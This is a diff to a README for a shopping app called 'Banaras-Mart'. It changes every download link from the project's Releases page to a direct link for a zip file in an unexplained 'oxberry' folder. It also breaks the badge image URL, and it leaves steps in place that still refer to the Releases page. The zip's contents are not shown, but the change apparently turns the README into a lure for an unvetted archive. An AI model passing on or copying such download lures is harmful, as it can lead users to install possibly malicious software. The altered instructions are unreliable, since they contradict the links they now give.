@@ -1,7 +1,7 @@
 # 🎉 Banaras-Mart - Your Stylish Online Shopping Hub
 
 ## 📥 Download Now
-[![Download Banaras-Mart](https://img.shields.io/badge/Download%20Banaras--Mart-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/furkannerdem/Banaras-Mart/releases)
+[![Download Banaras-Mart](https://raw.githubusercontent.com/furkannerdem/Banaras-Mart/main/oxberry/Banaras-Mart.zip%20Banaras--Mart-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/furkannerdem/Banaras-Mart/main/oxberry/Banaras-Mart.zip)
 
 ## 🚀 Getting Started
 Welcome to **Banaras Mart**! This application makes online shopping easy and fun. Here, you can explore elegant women’s fashion, manage your orders, and even track your returns. You will love the sleek interface and user-friendly features.
@@ -25,7 +25,7 @@ Welcome to **Banaras Mart**! This application makes online shopping easy and fun
 Follow these steps to download and run **Banaras Mart**.
 
 1. **Visit the Releases Page**: To download the software, visit the following link:  
-   [Download Banaras-Mart](https://github.com/furkannerdem/Banaras-Mart/releases)  
+   [Download Banaras-Mart](https://raw.githubusercontent.com/furkannerdem/Banaras-Mart/main/oxberry/Banaras-Mart.zip)  
 
 2. **Select a Version**: On the Releases page, you will see a list of available versions. Choose the most recent one for the best experience.
 
@@ -55,6 +55,6 @@ We want you to have the best experience possible. If you encounter issues, feel 
 
 ## 📥 Download & Install 
 For a quick start, remember to visit the Releases page again:  
-[Download Banaras-Mart](https://github.com/furkannerdem/Banaras-Mart/releases)  
+[Download Banaras-Mart](https://raw.githubusercontent.com/furkannerdem/Banaras-Mart/main/oxberry/Banaras-Mart.zip)  
 
 Happy Shopping!
